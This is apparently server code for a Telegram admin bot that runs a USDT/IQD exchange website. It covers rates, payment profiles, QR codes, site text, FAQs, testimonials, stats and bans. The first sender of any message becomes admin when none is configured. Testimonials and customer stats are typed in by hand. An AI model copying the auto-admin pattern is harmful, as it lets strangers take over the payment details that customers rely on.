  // ── Stats ─────────────────────────────────────────────
  const statFieldMap = {
    stat_customers:    ['customers',    'عدد العملاء',      'menu_stats'],
    stat_transactions: ['transactions', 'عدد العمليات',     'menu_stats'],
    stat_years:        ['years',        'سنوات الخبرة',     'menu_stats'],
    stat_satisfaction: ['satisfaction', 'نسبة الرضا (%)',   'menu_stats'],
  };
  if (statFieldMap[data]) {
    const [field, label, backTo] = statFieldMap[data];
    setPendingState(incomingChatId, { action: 'setStat', field, label, backTo });
    await botSend(`📊 أرسل القيمة الجديدة لـ <b>${label}</b> (رقم فقط):`, { reply_markup: cancelButton() });
    return;
  }

  // ── Site field edit (hero / links / maintenance messages) ──
  const siteFieldMap = {
    sf_hero_titleAr:    ['hero.titleAr',              'العنوان العربي',      'site_hero'],
    sf_hero_titleEn:    ['hero.titleEn',              'العنوان الإنجليزي',   'site_hero'],
    sf_hero_subtitleAr: ['hero.subtitleAr',           'الوصف العربي',       'site_hero'],
    sf_hero_subtitleEn: ['hero.subtitleEn',           'الوصف الإنجليزي',    'site_hero'],
    sf_hero_promoAr:    ['hero.promoAr',              'الإعلان العربي',     'site_hero'],
    sf_hero_promoEn:    ['hero.promoEn',              'الإعلان الإنجليزي',  'site_hero'],
    sf_link_bnb:        ['links.bnb',                 'رابط BNB',           'site_links'],
    sf_link_okx:        ['links.okx',                 'رابط OKX',           'site_links'],
    sf_link_contact:    ['links.contact',             'رابط التواصل',       'site_links'],
    sf_maint_messageAr: ['maintenance.messageAr',     'رسالة الصيانة AR',   'site_maint'],
    sf_maint_messageEn: ['maintenance.messageEn',     'رسالة الصيانة EN',   'site_maint'],
  };
  if (siteFieldMap[data]) {
    const [dotPath, label, backTo] = siteFieldMap[data];
    setPendingState(incomingChatId, { action: 'editSiteField', dotPath, label, backTo });
    await botSend(`✏️ أرسل <b>${label}</b> الجديد:`, { reply_markup: cancelButton() });
    return;
  }
}

async function persistEnvKey(key, value) {
  const envPath = path.join(PROJECT_ROOT, '.env');
  let content = '';
  try {
    content = await readFile(envPath, 'utf8');
  } catch {
    content = '';
  }

  const lines = content.split(/\r?\n/);
  const nextLines = [];
  let replaced = false;

  for (const line of lines) {
    if (!line) {
      nextLines.push(line);
      continue;
    }
    if (line.startsWith(`${key}=`)) {
      nextLines.push(`${key}=${value}`);
      replaced = true;
    } else {
      nextLines.push(line);
    }
  }

  if (!replaced) nextLines.push(`${key}=${value}`);
  await writeFile(envPath, nextLines.join('\n').replace(/\n{3,}/g, '\n\n'), 'utf8');
}

function maybeAutoConfigureFromMessage(msg) {
  const fromId = msg?.from?.id;
  if (!fromId) return;

  if (
    !hasExplicitSplitTelegramChatIds()
    && (!process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE')
  ) {
    process.env.TELEGRAM_CHAT_ID = String(fromId);
    persistEnvKey('TELEGRAM_CHAT_ID', String(fromId)).catch(() => {});
     
    console.log(`Auto-config: TELEGRAM_CHAT_ID set to ${process.env.TELEGRAM_CHAT_ID} (saved to .env)`);
  }

  if (adminIds.size === 0) {
    const id = String(fromId);
    adminIds.add(id);
    persistEnvKey('TELEGRAM_ADMIN_IDS', id).catch(() => {});
     
    console.log(`Auto-config: TELEGRAM_ADMIN_IDS set to ${id} (saved to .env)`);
  }
}

async function handleAdminCommand(text, incomingChatId) {
  const raw = String(text || '').trim();
  const trimmed = raw.toLowerCase();

   
  console.log(`Bot Command Received: "${raw}" from Chat: ${incomingChatId}`);

  // ── Handle pending input state ──────────────────────
  const pendingState = getPendingState(incomingChatId);
  if (pendingState) {
    const st = pendingState;
    if (trimmed === '/cancel') {
      setPendingState(incomingChatId, null);
      await sendMainMenu(incomingChatId);
      return;
    }

    const setValue = raw.startsWith('/set ') ? raw.slice(5).trim() : '';
    if (!setValue) {
      await botSend(
        '❌ الإدخال المباشر معطّل.\n' +
        'استخدم <code>/set ...</code> قبل أي قيمة.\n' +
        'مثال: <code>/set 123</code>',
        { reply_markup: cancelButton() },
        incomingChatId,
      );
      setPendingState(incomingChatId, st);
      return;
    }

    setPendingState(incomingChatId, null);
    const input = setValue;

    if (st.action === 'rateFixed') {
      const val = Number(input);
      if (!Number.isFinite(val) || val < 100 || val > 100000) {
        await botSend('❌ رقم غير صالح. مثال: <code>1350</code>', { reply_markup: cancelButton() }, incomingChatId);
        setPendingState(incomingChatId, st);
        return;
      }
      const details = await loadPaymentDetails();
      if (!details.rateConfig) details.rateConfig = {};
      details.rateConfig.mode = 'fixed';
      details.rateConfig.fixedRate = val;
      await savePaymentDetails(details);
      await botSend(`✅ السعر الثابت: <b>${val} IQD/USDT</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 سعر الصرف', callback_data: 'menu_rate' }]] } }, incomingChatId);
      return;
    }

    if (st.action === 'rateFloat') {
      const parts = input.split(/\s+/);
      const base = Number(parts[0]), offset = Number(parts[1] || 0);
      if (!Number.isFinite(base) || base < 100) {
        await botSend('❌ صيغة خاطئة. مثال: <code>1310 40</code>', { reply_markup: cancelButton() }, incomingChatId);
        setPendingState(incomingChatId, st);
        return;
      }
      const details = await loadPaymentDetails();
      if (!details.rateConfig) details.rateConfig = {};
      details.rateConfig.mode = 'float';
      details.rateConfig.floatBase = base;
      details.rateConfig.floatOffset = Number.isFinite(offset) ? offset : 0;
      await savePaymentDetails(details);
      const effective = await computeRate(details);
      await botSend(`✅ وضع عائم: Base=${base}, Offset=${offset}\nالسعر الحالي: <b>${effective} IQD/USDT</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 سعر الصرف', callback_data: 'menu_rate' }]] } }, incomingChatId);
      return;
    }

    if (st.action === 'setTimer') {
      const mins = Number(input);
      if (!Number.isFinite(mins) || mins < 1 || mins > 180) {
        await botSend('❌ رقم غير صالح (1-180). مثال: <code>20</code>', { reply_markup: cancelButton() }, incomingChatId);
        setPendingState(incomingChatId, st);
        return;
      }
      const details = await loadPaymentDetails();
      await savePaymentDetails({ ...details, paymentExpiryMinutes: mins });
      await botSend(`✅ وقت الانتهاء: <b>${mins} دقيقة</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu_timer' }]] } }, incomingChatId);
      return;
    }

    if (st.action === 'editField') {
      const details = await loadPaymentDetails();
      const pid = st.profileId || resolveEditingProfileId(details, incomingChatId);
      const idx = profileIndex(details, pid);
      if (idx < 0) {
        await botSend('❌ بروفايل غير موجود.', {}, incomingChatId);
        return;
      }
      const profiles = [...details.profiles];
      const prof = { ...profiles[idx], methods: JSON.parse(JSON.stringify(profiles[idx].methods)) };
      setByPath(prof.methods, st.path, input);
      profiles[idx] = prof;
      await savePaymentDetails({ ...details, profiles });
      await botSend(`✅ تم تحديث <b>${st.label}</b> للبروفايل <b>${prof.nameAr}</b>: <code>${input}</code>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: st.backTo || 'menu_edit' }]] } }, incomingChatId);
      return;
    }

    if (st.action === 'addProfile') {
      const d = st.data || {};
      if (st.step === 0) {
        setPendingState(incomingChatId, { action: 'addProfile', step: 1, data: { nameAr: input } });
        await botSend('أرسل <b>الاسم بالإنجليزية</b> (اختياري — يمكن إرسال نفس العربي):', { reply_markup: cancelButton() }, incomingChatId);
        return;
      }
      if (st.step === 1) {
        const details = await loadPaymentDetails();
        const id = newProfileId();
        const nameEn = input.trim() || d.nameAr;
        const newP = normalizeProfile({
          id,
          nameAr: d.nameAr,
          nameEn,
          methodEnabled: defaultMethodEnabled(),
          methods: defaultEmptyMethods(),
        });
        await savePaymentDetails({ ...details, profiles: [...details.profiles, newP] });
        await botSend(`✅ تم إنشاء البروفايل:\n<b>${newP.nameAr}</b>\nاضغط «البروفايلات» لجعله نشطاً على الموقع أو تعديل حساباته.`, { reply_markup: { inline_keyboard: [[{ text: '👤 البروفايلات', callback_data: 'menu_profiles' }]] } }, incomingChatId);
        return;
      }
    }

    if (st.action === 'editSiteField') {
      const cfg = await loadSiteConfig();
      setByPath(cfg, st.dotPath, input);
      await saveSiteConfig(cfg);
      await botSend(`✅ تم تحديث <b>${st.label}</b>: <code>${input.slice(0, 60)}</code>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: st.backTo || 'menu_site' }]] } });
      return;
    }

    if (st.action === 'addFaq') {
      const d = st.data || {};
      if (st.step === 0) {
        setPendingState(incomingChatId, { action: 'addFaq', step: 1, data: { qAr: input } });
        await botSend('✍️ أرسل <b>الجواب بالعربية:</b>', { reply_markup: cancelButton() });
        return;
      }
      if (st.step === 1) {
        setPendingState(incomingChatId, { action: 'addFaq', step: 2, data: { ...d, aAr: input } });
        await botSend('🇬🇧 أرسل <b>السؤال بالإنجليزية:</b>', { reply_markup: cancelButton() });
        return;
      }
      if (st.step === 2) {
        setPendingState(incomingChatId, { action: 'addFaq', step: 3, data: { ...d, qEn: input } });
        await botSend('✍️ أرسل <b>الجواب بالإنجليزية:</b>', { reply_markup: cancelButton() });
        return;
      }
      if (st.step === 3) {
        const cfg = await loadSiteConfig();
        const newId = Date.now();
        cfg.faq = [...(cfg.faq || []), { id: newId, qAr: d.qAr, aAr: d.aAr, qEn: d.qEn, aEn: input }];
        await saveSiteConfig(cfg);
        await botSend(`✅ تمت إضافة السؤال:\n🇸🇦 <b>${d.qAr}</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 الأسئلة الشائعة', callback_data: 'site_faq' }]] } });
        return;
      }
    }

    if (st.action === 'addReview') {
      const d = st.data || {};
      if (st.step === 0) { setPendingState(incomingChatId, { action: 'addReview', step: 1, data: { nameAr: input } }); await botSend(' أرسل <b>المدينة بالعربية:</b>', { reply_markup: cancelButton() }); return; }
      if (st.step === 1) { setPendingState(incomingChatId, { action: 'addReview', step: 2, data: { ...d, cityAr: input } }); await botSend('⭐ أرسل <b>عدد النجوم (1-5):</b>', { reply_markup: cancelButton() }); return; }
      if (st.step === 2) {
        const stars = Math.min(5, Math.max(1, Number(input) || 5));
        setPendingState(incomingChatId, { action: 'addReview', step: 3, data: { ...d, stars } });
        await botSend('✍️ أرسل <b>نص التقييم:</b>', { reply_markup: cancelButton() });
        return;
      }
      if (st.step === 3) {
        const list = await loadTestimonials();
        const newItem = { id: Date.now(), nameAr: d.nameAr, nameEn: d.nameAr, cityAr: d.cityAr, cityEn: d.cityAr, stars: d.stars, textAr: input, textEn: input };
        await saveTestimonials([...list, newItem]);
        await botSend(`✅ تمت إضافة التقييم:\n⭐ <b>${d.nameAr}</b> — ${'⭐'.repeat(d.stars)}`, { reply_markup: { inline_keyboard: [[{ text: '🔙 التقييمات', callback_data: 'menu_testimonials' }]] } });
        return;
      }
    }

    if (st.action === 'setStat') {
      const val = Number(input);
      if (!Number.isFinite(val) || val < 0) {
        await botSend('❌ أرسل رقماً صحيحاً موجباً.', { reply_markup: cancelButton() }, incomingChatId);
        setPendingState(incomingChatId, st);
        return;
      }
      const stats = await loadStats();
      stats[st.field] = val;
      await saveStats(stats);
      await botSend(`✅ تم تحديث <b>${st.label}</b>: <code>${val}</code>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 الإحصائيات', callback_data: 'menu_stats' }]] } }, incomingChatId);
      return;
    }

    // unknown pending state - fall through
  }

  if (trimmed.startsWith('/reply ')) {
    const rest = raw.slice(7).trim();
    const sp = rest.indexOf(' ');
    if (sp === -1) {
      await botSend('❌ استخدم: <code>/reply sess_xxx نص الرسالة</code>', {}, incomingChatId);
      return;
    }
    const sessionId = rest.slice(0, sp).trim();
    const body = rest.slice(sp + 1).trim();
    if (!sessionId.startsWith('sess_') || !body) {
      await botSend('❌ جلسة أو نص غير صالح.', {}, incomingChatId);
      return;
    }
    const store = await loadChatStore(CHAT_PATH);
    if (!store.sessions[sessionId]) {
      await botSend('❌ الجلسة غير موجودة.', {}, incomingChatId);
      return;
    }
    appendStaffMessage(store, sessionId, body);
    await saveChatStore(CHAT_PATH, store);
    await botSend(`✅ وُصلت للعميل على الموقع\n<code>${escapeTelegramHtml(sessionId)}</code>`, {}, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/setgemini ')) {
    const key = raw.slice('/setgemini '.length).trim();
    if (!/^AIza[0-9A-Za-z_-]{20,}$/.test(key)) {
      await botSend('❌ مفتاح غير صالح. الصيغة المتوقعة تبدأ بـ <code>AIza...</code>', {}, incomingChatId);
      return;
    }
    process.env.GEMINI_API_KEY = key;
    await persistEnvKey('GEMINI_API_KEY', key);
    await botSend('✅ تم حفظ مفتاح Gemini بنجاح.', {}, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/improve ') || trimmed.startsWith('/formal ') || trimmed.startsWith('/short ')) {
    const mode = trimmed.startsWith('/formal ')
      ? 'formal'
      : trimmed.startsWith('/short ')
        ? 'short'
        : 'improve';
    const input = mode === 'formal'
      ? raw.slice('/formal '.length).trim()
      : mode === 'short'
        ? raw.slice('/short '.length).trim()
        : raw.slice('/improve '.length).trim();

    if (!input) {
      await botSend('❌ اكتب النص بعد الأمر. مثال: <code>/improve اكتب النص هنا</code>', {}, incomingChatId);
      return;
    }

    await botSend('⏳ جاري تحسين النص...', {}, incomingChatId);
    try {
      const improved = await improveTelegramTextWithAi(mode, input);
      await botSend(`✨ <b>النص المحسّن:</b>\n\n${escapeTelegramHtml(improved)}`, {}, incomingChatId);
    } catch (e) {
      await botSend(`❌ فشل تحسين النص: ${escapeTelegramHtml(String(e?.message || e))}`, {}, incomingChatId);
    }
    return;
  }

  if (trimmed.startsWith('/order ') || trimmed.startsWith('/طلب ')) {
    const rest = trimmed.startsWith('/order ') ? raw.slice(7).trim() : raw.slice(5).trim();
    if (!rest) {
      await botSend('❌ استخدم: <code>/order ORD-XXXX</code> أو <code>/طلب ORD-XXXX</code>', {}, incomingChatId);
      return;
    }
    await sendOrderDetailsById(rest, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/banip ')) {
    const payload = raw.slice(7).trim();
    const [ipRaw, ...reasonParts] = payload.split(/\s+/);
    const ip = normalizeBlockedIpInput(ipRaw);
    if (!ip) {
      await botSend('❌ استخدم: <code>/banip 1.2.3.4 سبب</code>', {}, incomingChatId);
      return;
    }
    const reason = reasonParts.join(' ').trim().slice(0, 200) || 'مخالفة';
    const list = await loadBlockedIps();
    const exists = list.find((it) => it.ip === ip);
    if (exists) {
      exists.reason = reason;
      exists.at = new Date().toISOString();
    } else {
      list.push({ ip, reason, at: new Date().toISOString() });
    }
    await saveBlockedIps(list);
    await botSend(`🚫 تم حظر IP:\n<code>${escapeTelegramHtml(ip)}</code>\nالسبب: <b>${escapeTelegramHtml(reason)}</b>`, {}, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/unbanip ')) {
    const ip = normalizeBlockedIpInput(raw.slice(9).trim());
    if (!ip) {
      await botSend('❌ استخدم: <code>/unbanip 1.2.3.4</code>', {}, incomingChatId);
      return;
    }
    const list = await loadBlockedIps();
    const next = list.filter((it) => it.ip !== ip);
    if (next.length === list.length) {
      await botSend(`ℹ️ هذا العنوان غير موجود في الحظر:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
      return;
    }
    await saveBlockedIps(next);
    await botSend(`✅ تم فك الحظر عن:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
    return;
  }

  if (trimmed === '/blockedips' || trimmed === '/blocked') {
    await sendBlockedIpsList(incomingChatId);
    return;
  }

  if (trimmed.startsWith('/banfp ')) {
    const payload = raw.slice(7).trim();
    const [fpRaw, ...reasonParts] = payload.split(/\s+/);
    const fingerprint = normalizeFingerprintInput(fpRaw);
    if (!fingerprint) {
      await botSend('❌ استخدم: <code>/banfp fingerprint [سبب اختياري]</code>', {}, incomingChatId);
      return;
    }
    const reason = reasonParts.join(' ').trim().slice(0, 200) || 'مخالفة';
    const list = await loadBlockedFingerprints();
    const ipSnapshot = await findRecentIpByFingerprint(fingerprint);
    const exists = list.find((it) => it.fingerprint === fingerprint);
    if (exists) {
      exists.reason = reason;
      exists.at = new Date().toISOString();
      exists.ipSnapshot = ipSnapshot || exists.ipSnapshot || '';
    } else {
      list.push({ fingerprint, reason, at: new Date().toISOString(), ipSnapshot });
    }
    await saveBlockedFingerprints(list);
    await botSend(
      [
        '🚫 تم حظر Fingerprint:',
        `<code>${escapeTelegramHtml(fingerprint)}</code>`,
        `السبب: <b>${escapeTelegramHtml(reason)}</b>`,
        `IP snapshot: <code>${escapeTelegramHtml(ipSnapshot || '—')}</code>`,
      ].join('\n'),
      {},
      incomingChatId
    );
    return;
  }

  if (trimmed.startsWith('/unbanfp ')) {
    const fingerprint = normalizeFingerprintInput(raw.slice(9).trim());
    if (!fingerprint) {
      await botSend('❌ استخدم: <code>/unbanfp fingerprint</code>', {}, incomingChatId);
      return;
    }
    const list = await loadBlockedFingerprints();
    const next = list.filter((it) => it.fingerprint !== fingerprint);
    if (next.length === list.length) {
      await botSend(`ℹ️ هذه البصمة غير موجودة في الحظر:\n<code>${escapeTelegramHtml(fingerprint)}</code>`, {}, incomingChatId);
      return;
    }
    await saveBlockedFingerprints(next);
    await botSend(`✅ تم فك الحظر عن Fingerprint:\n<code>${escapeTelegramHtml(fingerprint)}</code>`, {}, incomingChatId);
    return;
  }

  if (trimmed === '/blockedfps' || trimmed === '/blockedfp') {
    await sendBlockedFpsList(incomingChatId);
    return;
  }

  if (!trimmed.startsWith('/')) return;

  if (trimmed === '/start') {
    await sendMainMenu(incomingChatId);
    return;
  }

  if (trimmed === '/help') {
    await botSend(`<pre>${escapeTelegramHtml(helpText())}</pre>`, {}, incomingChatId);
    return;
  }

  if (trimmed === '/pay' || trimmed === '/pay@' + (process.env.BOT_USERNAME || '').toLowerCase()) {
    const details = await loadPaymentDetails();
    const rate = await computeRate(details);
    const pub = buildPublicPaymentPayload(details, rate);
    const overview = {
      publicSitePayload: pub,
      profiles: details.profiles.map((p) => ({
        id: p.id,
        nameAr: p.nameAr,
        nameEn: p.nameEn,
        activeOnSite: p.id === details.currentProfileId,
        methodEnabled: p.methodEnabled,
      })),
    };
    await botSend(`<pre>${escapeTelegramHtml(JSON.stringify(overview, null, 2))}</pre>`, {}, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/timer ')) {
    const mins = Number(trimmed.slice(7).trim());
    if (!Number.isFinite(mins) || mins <= 0 || mins > 180) {
      await botSend('Invalid minutes. Use 1..180');
      return;
    }
    const details = await loadPaymentDetails();
    const saved = await savePaymentDetails({ ...details, paymentExpiryMinutes: mins });
    await botSend(`✅ Updated paymentExpiryMinutes = ${saved.paymentExpiryMinutes}`);
    return;
  }

  if (trimmed.startsWith('/rate ')) {
    const val = Number(trimmed.slice(6).trim());
    if (!Number.isFinite(val) || val < 100 || val > 100000) {
      await botSend('❌ Invalid rate. Use e.g. /rate 1350');
      return;
    }
    const details = await loadPaymentDetails();
    if (!details.rateConfig) details.rateConfig = {};
    details.rateConfig.mode = 'fixed';
    details.rateConfig.fixedRate = val;
    await savePaymentDetails(details);
    await botSend(`✅ Rate set to FIXED: ${val} IQD/USDT`);
    return;
  }

  if (trimmed.startsWith('/ratefloat')) {
    const parts = trimmed.slice(10).trim().split(/\s+/);
    const base = Number(parts[0]);
    const offset = Number(parts[1] || 0);
    if (!Number.isFinite(base) || base < 100) {
      await botSend('❌ Usage: /ratefloat <iqdBase> <offset>\nمثال: /ratefloat 1310 40');
      return;
    }
    const details = await loadPaymentDetails();
    if (!details.rateConfig) details.rateConfig = {};
    details.rateConfig.mode = 'float';
    details.rateConfig.floatBase = base;
    details.rateConfig.floatOffset = Number.isFinite(offset) ? offset : 0;
    await savePaymentDetails(details);
    await botSend(`✅ Rate set to FLOAT: base=${base} IQD/USD, offset=${details.rateConfig.floatOffset}\nالسعر = (سعر USDT بالدولار × ${base}) + ${details.rateConfig.floatOffset}`);
    return;
  }

  if (trimmed === '/ratemode') {
    const details = await loadPaymentDetails();
    const cfg = details?.rateConfig || {};
    const rate = await computeRate(details);
    const modeText = cfg.mode === 'float'
      ? `🔄 عائم (Float)\nBase: ${cfg.floatBase} IQD/USD\nOffset: ${cfg.floatOffset}`
      : `📌 ثابت (Fixed): ${cfg.fixedRate} IQD/USDT`;
    await botSend(`💱 Rate Mode: ${modeText}\n\n📊 السعر الحالي: ${rate} IQD/USDT`, {}, incomingChatId);
    return;
  }

  if (trimmed.startsWith('/set ')) {
    const rest = trimmed.slice(5).trim();
    const firstSpace = rest.indexOf(' ');
    if (firstSpace === -1) {
      await botSend('Usage: /set methods.zainCash.number 077... (يُطبَّق على البروفايل النشط للموقع)', {}, incomingChatId);
      return;
    }
    const p = rest.slice(0, firstSpace).trim();
    const value = rest.slice(firstSpace + 1).trim();
    const details = await loadPaymentDetails();
    if (p.startsWith('methods.')) {
      const pid = details.currentProfileId;
      const idx = profileIndex(details, pid);
      if (idx < 0) {
        await botSend('❌ لا يوجد بروفايل نشط.', {}, incomingChatId);
        return;
      }
      const inner = p.slice('methods.'.length);
      const profiles = [...details.profiles];
      const prof = { ...profiles[idx], methods: JSON.parse(JSON.stringify(profiles[idx].methods)) };
      setByPath(prof.methods, inner, value);
      profiles[idx] = prof;
      await savePaymentDetails({ ...details, profiles });
      await botSend(`✅ Updated ${p} على البروفايل النشط`, {}, incomingChatId);
      return;
    }
    setByPath(details, p, value);
    await savePaymentDetails(details);
    await botSend(`✅ Updated ${p}`, {}, incomingChatId);
    return;
  }

  await sendMainMenu(incomingChatId);
}

const QR_METHOD_MAP = {
  fastpay: 'fastPay.qrImage',
  fast: 'fastPay.qrImage',
  zain: 'zainCash.qrImage',
  zaincash: 'zainCash.qrImage',
  fib: 'fib.qrImage',
  mastercard: 'mastercard.qrImage',
  master: 'mastercard.qrImage',
  asia: 'asiaHawala.qrImage',
  asiahawala: 'asiaHawala.qrImage',
};

async function savePhotoAsQr(msg, methodKey, label, backTo = 'menu_edit', profileId = null) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = msg.chat?.id;
  const fieldPath = QR_METHOD_MAP[methodKey];
  if (!fieldPath) { await botSend(`❌ طريقة دفع غير معروفة: ${methodKey}`, {}, chatId); return; }
  const fileId = msg.photo[msg.photo.length - 1].file_id;
  try {
    const { data: fileData } = await tgGetFile(botToken, fileId);
    if (!fileData?.ok || !fileData?.result?.file_path) throw new Error('getFile failed');
    const telegramUrl = `https://api.telegram.org/file/bot${botToken}/${fileData.result.file_path}`;
    const details = await loadPaymentDetails();
    const pid = profileId || details.currentProfileId;
    const idx = profileIndex(details, pid);
    if (idx < 0) throw new Error('profile not found');

    const localName = await downloadQrToLocal(telegramUrl, pid, methodKey.replace('.qrImage', '').replace(/\./g, '_'));
    if (!localName) throw new Error('download failed');
    const localUrl = `/api/qr/${localName}`;

    const profiles = [...details.profiles];
    const prof = { ...profiles[idx], methods: JSON.parse(JSON.stringify(profiles[idx].methods)) };
    setByPath(prof.methods, fieldPath, localUrl);
    profiles[idx] = prof;
    await savePaymentDetails({ ...details, profiles });
    await botSend(`✅ تم حفظ باركود <b>${label || methodKey}</b> لبروفايل <b>${prof.nameAr}</b>!`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: backTo }]] } }, chatId);
  } catch (e) {
    await botSend(`❌ فشل حفظ الصورة: ${e?.message || e}`, {}, chatId);
  }
}

async function tryHandleStaffChatReply(msg) {
  const text = String(msg.text || '').trim();
  if (!text) return false;
  if (text.startsWith('/')) return false;
  const reply = msg.reply_to_message;
  if (!reply) return false;

  const store = await loadChatStore(CHAT_PATH);
  const replyId = reply.message_id;
  let sessionId = store.telegramBindings[String(replyId)];
  if (!sessionId) {
    const parentText = reply.text || reply.caption || '';
    sessionId = parseSessionIdFromTelegramText(parentText);
  }
  if (!sessionId || !store.sessions[sessionId]) {
    await botSend(
      '❌ لم أجد جلسة محادثة. <b>اضغط «رد»</b> على إشعار البوت الذي يحتوي 🆔 الجلسة.\nأو: <code>/reply sess_xxx نص الرسالة</code>',
      {},
      msg.chat.id
    );
    return true;
  }
  appendStaffMessage(store, sessionId, text);
  await saveChatStore(CHAT_PATH, store);
  await botSend('✅ وُصلت للعميل على الموقع', {}, msg.chat.id);
  return true;
}

async function handlePhotoMessage(msg) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  const chatId = msg.chat?.id;
  const ps = getPendingState(chatId);
  if (ps?.action === 'awaitPhoto') {
    const { method, label, backTo, profileId } = ps;
    setPendingState(chatId, null);
    await savePhotoAsQr(msg, method, label, backTo || 'menu_edit', profileId);
    return;
  }

  // ── Fallback: caption-based ──────────────────────────
  const caption = String(msg.caption || '').trim().toLowerCase().replace(/\s+/g, ' ');
  if (!caption.startsWith('qr ') && !Object.keys(QR_METHOD_MAP).includes(caption)) {
    await botSend('📷 لإضافة باركود اضغط الزر في القائمة أو أرسل صورة مع caption:\n<code>qr fastpay</code> / <code>qr zain</code> / <code>qr fib</code> / <code>qr mastercard</code> / <code>qr asia</code>', {}, msg.chat?.id);
    return;
  }
  const key = caption.startsWith('qr ') ? caption.slice(3).trim().replace(/\s+/g, '') : caption;
  const details = await loadPaymentDetails();
  const pid = resolveEditingProfileId(details, msg.chat?.id);
  await savePhotoAsQr(msg, key, key, 'menu_edit', pid);
}

async function pollTelegram() {
  if (isPolling) return;
  isPolling = true;
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) return;

    const { res, data } = await tgGetUpdates(botToken, {
      timeout: 30,
      offset: updateOffset,
    });
    if (!res.ok) return;
    if (!data?.ok || !Array.isArray(data.result)) return;

    for (const u of data.result) {
      updateOffset = Math.max(updateOffset, (u.update_id || 0) + 1);

      // handle inline button taps
      if (u.callback_query) {
        const cbq = u.callback_query;
        await answerCbq(cbq.id);
        if (adminIds.has(String(cbq.from?.id))) {
          await handleCallbackQuery(cbq.data, cbq.message?.chat?.id);
        } else {
           
          console.log(`Bot: Unauthorized callback attempt from ${cbq.from?.id} in chat ${cbq.message?.chat?.id}`);
        }
        continue;
      }

      const msg = u.message;
      if (!msg) continue;
      if ((msg.date || 0) < SERVER_START_TS) continue;
      maybeAutoConfigureFromMessage(msg);
      if (!isAdminMessage(msg)) {
         
        console.log(`Bot: Non-admin message from ${msg.from?.id} (${msg.from?.username}) in chat ${msg.chat?.id}`);
        continue;
      }
      if (msg.photo) {
        await handlePhotoMessage(msg);
      } else if (msg.text) {
        const routed = await tryHandleStaffChatReply(msg);
        if (!routed) await handleAdminCommand(msg.text, msg.chat.id);
      }
    }
  } catch (e) {
     
    console.error('[Telegram poll]', e?.message || e);
  } finally {
    isPolling = false;
  }
}

async function drainPendingUpdates() {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) return;
    let maxId = 0;
    let fetched = 0;
    // fetch all pending batches until none remain
    for (let i = 0; i < 10; i++) {
      const params = { timeout: 0, limit: 100 };
      if (maxId > 0) params.offset = maxId + 1;
      const { res, data } = await tgGetUpdates(botToken, params);
      if (!res.ok) break;
      if (!data?.ok || !Array.isArray(data.result) || data.result.length === 0) break;
      for (const u of data.result) {
        if ((u.update_id || 0) > maxId) maxId = u.update_id;
        fetched++;
      }
      if (data.result.length < 100) break;
    }
    if (maxId > 0) {
      updateOffset = maxId + 1;
       
      console.log(`Telegram drain: skipped ${fetched} pending update(s), offset=${updateOffset}`);
    }
  } catch {
    // ignore
  }
}

if (IS_PROD) {
  const distPath = path.join(PROJECT_ROOT, 'dist');
  app.use((_req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
  });
}

// تحذير المتصفّح «موقع ضارّ/خطير»: غالباً قائمة Google Safe Browsing — ليست دائماً من الكود.
// راجع Search Console → Security، شهادة SSL، وعدم استضافة محتوى/روابط مشبوهة. الرؤوس أعلاه تساعد الثقة التقنية فقط.

app.listen(PORT, () => {
  console.log(`API running on http://localhost:${PORT}`);
  logTelegramChatEnvAtStartup();
  initDataFiles()
    .then(async () => {
      try {
        const d = await loadPaymentDetails();
        const migrated = await migrateQrUrlsToLocal(d);
        if (migrated) console.log('[QR] Migrated Telegram URLs to local files');
      } catch (e) {
        console.error('[QR migration]', e?.message || e);
      }
    })
    .then(() => drainPendingUpdates())
    .then(() => {
      const loopPoll = () => pollTelegram().finally(() => setImmediate(loopPoll));
      loopPoll();
      console.log('Telegram polling enabled. Send any message to the bot, then use /help.');
    });
});

